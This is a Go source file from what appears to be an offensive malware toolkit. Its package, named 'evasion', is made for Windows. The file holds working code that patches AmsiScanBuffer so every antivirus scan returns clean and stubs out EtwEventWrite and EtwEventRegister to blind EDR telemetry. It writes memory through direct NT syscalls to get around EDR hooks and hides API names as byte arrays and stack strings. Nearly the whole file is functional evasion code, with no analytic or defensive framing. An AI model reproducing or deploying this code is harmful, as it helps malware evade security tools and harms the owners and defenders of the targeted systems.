//go:build windows
// +build windows

package evasion

import (
	"golang.org/x/sys/windows"
)

var (
	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")
)

// applyMemPatch writes patch bytes to addr using direct NT syscalls so that
// EDR hooks on kernel32!VirtualProtect do not intercept the operation.
// After unhookNtdll() the NT stubs are clean (no inline hook).
func applyMemPatch(addr uintptr, patch []byte) {
	if addr == 0 || len(patch) == 0 {
		return
	}
	patchSize := uintptr(len(patch))
	old, ok := ntProtect(addr, patchSize, windows.PAGE_EXECUTE_READWRITE)
	if !ok {
		return
	}
	ntWrite(addr, patch)
	ntFlush(addr, patchSize)
	ntProtect(addr, patchSize, old)
}

// patchAMSI patches AmsiScanBuffer with "xor eax,eax; ret" so every scan
// returns AMSI_RESULT_CLEAN without raising an exception.
// DLL and proc names are built from byte arrays — no string literals in binary.
func patchAMSI() {
	amsi := windows.NewLazySystemDLL(sAmsiDLL())
	proc := amsi.NewProc(sAmsiScanBuffer())
	if proc.Find() != nil {
		return
	}
	applyMemPatch(proc.Addr(), []byte{0x31, 0xC0, 0xC3}) // xor eax,eax; ret
}

// patchETW patches EtwEventWrite with a single "ret" so the process emits
// no ETW events visible to EDR sensors.
func patchETW() {
	ntdll := windows.NewLazySystemDLL(sNtdll())
	proc := ntdll.NewProc(sEtwEventWrite())
	if proc.Find() != nil {
		return
	}
	applyMemPatch(proc.Addr(), []byte{0xC3}) // ret
}

// patchEtwRegister patches EtwEventRegister → ret so any future ETW provider
// registrations in this process silently fail.  Complements patchETW which
// only silences writes on already-registered providers.
func patchEtwRegister() {
	ntdll := windows.NewLazySystemDLL(sNtdll())
	// "EtwEventRegister" as stack string
	proc := ntdll.NewProc(stackStr(
		'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'R', 'e', 'g', 'i', 's', 't', 'e', 'r',
	))
	if proc.Find() != nil {
		return
	}
	applyMemPatch(proc.Addr(), []byte{0xC3}) // ret
}
